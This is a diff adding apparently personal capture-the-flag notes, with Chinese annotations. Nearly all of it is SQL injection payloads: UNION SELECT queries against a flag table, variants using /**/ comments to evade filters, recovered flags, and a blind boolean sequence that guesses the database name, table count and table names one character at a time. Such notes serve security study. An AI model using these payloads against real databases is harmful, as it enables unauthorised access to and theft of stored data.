@@ -1,0 +1,54 @@
+' union select 1,flag from flag -- 
+flag{e10adc3949ba59abbe56e057f20f883e}
+
+'union/**/Select/**/*/**/from/**/flag/**/#
+flag{ZmxhZ3tlYXN5fQ==}
+
+'union/**/Select/**/*/**/from/**/flag/**/#
+flag{%66%6C%61%67%7B%69%74%20%69%73%20%76%65%72%79%20%68%61%72%64%7D}
+
+flag{e10adc3949ba59abbe56e057f20f883e}
+
+1' and length(database())>3#（当前所连接数据库名称的长度=3）
+name:1
+age:1
+year:1
+
+ID:1' and ascii(substr(database(),1,1))>112#		(p)
+name:1
+age:1
+year:1
+
+ID:1' and ascii(substr(database(),2,1))>118#		(v)
+name:1
+age:1
+year:1
+
+1' and ascii(substr(database(),3,1))>100#		(d)
+
+ID:1' and (select count(table_name) from information_schema.tables 
+where table_schema=database())>2#				pvd数据库中表的个数=2
+name:1
+age:1
+year:1
+ID:1' and length(substr((select table_name from 
+information_schema.tables where table_schema=database() limit 0,1),1))>3 #
+name:1					
+age:1					pvd数据库中第一个表的名称字符长度=3
+year:1
+
+1' and length(substr((select table_name
+ from information_schema.tables where table_schema=database() limit 0,1),2))>2 #
+
+					pvd数据库中第二个表的名称字符长度=2
+
+第一个表的字符：（eee)
+1' and ascii(substr((select table_name from 
+information_schema.tables where table_schema=database() limit 0,1),1,1))>101 #（e)
+
+1' and ascii(substr((select table_name from
+ information_schema.tables where table_schema=database() limit 0,1),1,2))>101 # （e)
+
+第二个表的字符：(kk)
+
+
